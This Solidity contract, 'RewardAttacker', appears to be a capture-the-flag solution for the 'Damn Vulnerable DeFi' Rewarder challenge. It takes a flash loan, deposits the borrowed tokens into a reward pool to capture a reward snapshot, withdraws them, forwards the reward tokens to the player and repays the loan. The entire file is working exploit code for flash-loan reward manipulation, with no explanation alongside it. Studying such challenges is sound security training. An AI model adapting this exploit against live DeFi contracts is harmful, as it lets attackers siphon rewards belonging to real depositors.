//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken}from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract RewardAttacker{
    uint256 public amount = 1000000 ether;
    FlashLoanerPool public flashLoanerPool;
    TheRewarderPool public theRewarderPool;
    RewardToken public rewardToken;
    DamnValuableToken public damnValuableToken;
    address public player;


    constructor(address _flashLoanerPool, address _theRewarderPool, address _rewardToken, address _damnValuableToken, address _player){
        flashLoanerPool = FlashLoanerPool(_flashLoanerPool);
        theRewarderPool = TheRewarderPool(_theRewarderPool);
        rewardToken = RewardToken(_rewardToken);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        player = _player;
    }

    function getLoan() public {
        flashLoanerPool.flashLoan(amount);
    }
    function receiveFlashLoan(uint256 _amount) public{
        require(damnValuableToken.balanceOf(address(this)) == _amount, "Don't get loan");
        damnValuableToken.approve(address(theRewarderPool), _amount);
        theRewarderPool.deposit(_amount);
        theRewarderPool.withdraw(_amount);
        uint playerReward = rewardToken.balanceOf(address(this));
        require(playerReward > 0, "No reward");
        rewardToken.transfer(player, playerReward);
        damnValuableToken.transfer(address(flashLoanerPool), _amount);
    }

}